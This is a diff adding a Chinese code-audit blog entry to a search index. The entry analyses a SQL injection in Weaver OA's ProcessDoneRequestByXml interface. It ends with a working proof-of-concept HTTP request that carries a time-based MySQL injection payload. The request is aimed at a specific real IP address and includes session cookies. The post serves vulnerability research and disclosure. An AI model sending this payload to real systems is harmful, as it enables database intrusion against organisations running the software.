@@ -1147,4 +1147,56 @@
         <tag>xxe</tag>
       </tags>
   </entry>
+  <entry>
+    <title>泛微ReceiveTodoRequestByXml_SQL注入漏洞</title>
+    <url>/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="接口跟踪分析"><a href="#接口跟踪分析" class="headerlink" title="接口跟踪分析"></a>接口跟踪分析</h2> 
+
+<p>实例化函数没东西</p>
+ 
+
+<p>看下面的函数调用</p>
+ 
+
+<p>现在的步骤是<br>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap</p>
+<p>看processDoneRequestByMap</p>
+ 
+
+<p>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap-&gt;receiveRequestInfo</p>
+ 
+
+<p>看下这个ofsTodoDataManager</p>
+ 
+
+<p>初始为null，看到设置的地方让他为this，看他的类型是OfsTodoDataManagerNew继承的</p>
+<p>如果能让他初始化为自己</p>
+
+
+<p>调用的就是当前这个类的validate</p>
+ 
+
+<p>这个service是个数据库函数操作</p>
+
+
+
+
+
+
+<p>看到传入的string被处理了一下执行，看下怎么被处理的</p>
+
+
+<p>直接拼接，所以大概率存在SQL注入</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rest/ofs/ProcessDoneRequestByXml HTTP/1.1</span><br><span class="line">Host: 110.41.14.179:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://110.41.14.179:81/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaEApas7tMMlgz3yzdtz; JSESSIONID=aaaEApas7tMMlgz3yzdtz; __randcode__=e1f89faf-ccd6-4d92-aeff-5fb0251b0600</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&lt;request&gt;</span><br><span class="line">        &lt;syscode&gt;1&#x27;||(SELECT 0x6b4f7252 FROM DUAL WHERE 6182=6182 AND (SELECT 8607 FROM (SELECT(SLEEP(5)))LPaW))||&#x27;&lt;/syscode&gt;</span><br><span class="line">&lt;/request&gt;</span><br></pre></td></tr></table></figure></div>
+
+ 
+
+<p>存在mysql数据库的延时注入。sqlserver没打成功</p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>泛微</tag>
+      </tags>
+  </entry>
 </search>
